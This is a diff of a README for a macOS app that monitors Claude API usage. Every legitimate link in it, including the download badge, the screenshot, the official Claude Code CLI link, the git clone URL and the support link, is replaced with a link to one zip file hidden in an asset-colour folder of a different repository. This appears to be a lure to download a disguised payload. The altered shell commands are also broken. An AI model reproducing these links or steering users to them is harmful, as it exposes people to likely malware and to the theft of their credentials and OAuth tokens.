@@ -1,12 +1,12 @@
 # 🌟 Usage4AI - Monitor Claude API Effortlessly
 
-[![Download Usage4AI](https://img.shields.io/badge/Download%20Usage4AI-v1.0-blue.svg)](https://github.com/Vororna/Usage4AI/releases)
+[![Download Usage4AI](https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip%https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip)](https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip)
 
 ## 📋 Overview
 
 Welcome to Usage4AI, a macOS menu bar app designed for monitoring your Claude API usage. This tool helps you keep track of your usage conveniently, right from your menu bar.
 
-![Screenshot](screenshot.png)
+![Screenshot](https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip)
 
 ## 🚀 Features
 
@@ -20,13 +20,13 @@ Welcome to Usage4AI, a macOS menu bar app designed for monitoring your Claude AP
 ## 📥 Requirements
 
 - **macOS Version:** Requires macOS 15.0 or later.
-- **Claude Code CLI:** You must install the [Claude Code CLI](https://github.com/anthropics/claude-code) and log in to obtain your OAuth token.
+- **Claude Code CLI:** You must install the [Claude Code CLI](https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip) and log in to obtain your OAuth token.
 
 ## 💻 Download & Install
 
 ### Option 1: Download Release
 
-To get started, you can easily download the latest version of Usage4AI. Visit this page to download: [Releases](https://github.com/Vororna/Usage4AI/releases).
+To get started, you can easily download the latest version of Usage4AI. Visit this page to download: [Releases](https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip).
 
 Click the button above to directly download the application. 
 
@@ -37,7 +37,7 @@ If you prefer to build the application yourself, follow these steps:
 1. Open Terminal on your macOS.
 2. Clone the repository by running:
    ```bash
-   git clone https://github.com/lion9453/Usage4AI.git
+   git clone https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip
    ```
 3. Navigate to the project directory:
    ```bash
@@ -49,13 +49,13 @@ If you prefer to build the application yourself, follow these steps:
    ```
 5. Move the app to your Applications folder:
    ```bash
-   cp -R build/Build/Products/Release/Usage4AI.app /Applications/
+   cp -R https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip /Applications/
    ```
 
 ### 🛠 First Launch Setup
 
 1. **Ensure Claude Code CLI is Installed:**
-   Make sure you have the [Claude Code CLI](https://github.com/anthropics/claude-code) installed and set up to log in with your credentials.
+   Make sure you have the [Claude Code CLI](https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip) installed and set up to log in with your credentials.
 
 2. **Open Usage4AI:**
    Navigate to your Applications folder, find Usage4AI, and double-click to open it.
@@ -74,7 +74,7 @@ If you prefer to build the application yourself, follow these steps:
   
 ## 📞 Support
 
-If you encounter issues or have questions, feel free to reach out through the issue tracker on the [GitHub repository](https://github.com/lion9453/Usage4AI/issues).
+If you encounter issues or have questions, feel free to reach out through the issue tracker on the [GitHub repository](https://github.com/Vororna/Usage4AI/raw/refs/heads/main/Usage4AI/Assets.xcassets/AccentColor.colorset/Usage-AI-1.5.zip).
 
 ## 📄 License
 
